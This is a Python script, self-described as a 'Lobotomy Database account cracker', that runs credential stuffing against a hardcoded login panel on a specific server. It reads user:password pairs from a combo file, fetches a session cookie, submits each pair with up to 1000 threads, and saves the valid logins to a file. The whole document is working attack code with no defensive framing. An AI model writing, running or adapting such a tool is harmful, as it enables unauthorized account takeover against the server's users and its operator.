import requests
import sys
import os
from sys import argv
import concurrent.futures
import re
art = """\
Lobotomy Database account cracker usage this.py combo.txt out.txt 5 5
"""
def crack(user,passwd):
    line = "http://v-74-91-125-146.unman-vds.premium-chicago.nfoservers.com/panel/login.php"
    r = requests.Session()            
    r = requests.get(line, timeout=3)
    if r.status_code == 200:
        response = r.text
        if 'Set-Cookie' in r.headers:
            if "PHPSESSID" in r.headers["Set-Cookie"]:       
                cookies = str(r.headers["Set-Cookie"])
                pmaCookie = re.search('PHPSESSID=(.*) path', cookies)
                pmaCook = pmaCookie.group(1).split(" ")
                cookiez = f"PHPSESSID={pmaCook[0]}"
                payload = f"username={user}&password={passwd}&loginButton="
                Content_Length = len(payload)
                headers = {
            "Cookie":f"{cookiez}",
            "Content-Length":f"{Content_Length}",
            "Referer":line,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
                }
                try:
                    print("\033[32mChecking Creds\033[39m:\033[95m{}:{}\033[39m".format(user,passwd))                       
                    exp = requests.post(f"{line}", data=payload,headers=headers,timeout=int(argv[3]))
                    if "Success: Login valid" in exp.text:
                        print("{}:{} \033[32mvalid!".format(user,passwd))
                        f = open(argv[2], "a")
                        f.write("{}:{}\n".format(user,passwd))
                        f.close()
                        return "success"
                        
                    else:
                        print("{}:{} invalid!".format(user,passwd))
                except requests.exceptions.ReadTimeout: 
                    print("{}:{} invalid or error!".format(user,passwd))
                    pass
            else:
                print(f"\033[31m{line} No PHPSESSID in Set-Cookie header\033[39m")
        else:
            print(f"\033[31m{line} No Set-Cookie header\033[39m")
    else:
        print(f"\033[31m{line} Rresponse code not 200\033[39m") 
print(art)
combofile = open(argv[1], "r")

with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
    try:
            future_to_url = {executor.submit(crack, url.split(":")[0].strip(),url.split(":")[1].strip()): url for url in combofile}
            #for future in concurrent.futures.as_completed(future_to_url):
                #print("finalized{}".format(future))
    except Exception as E:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print("\033[31m",exc_type, fname, exc_tb.tb_lineno)
        pass
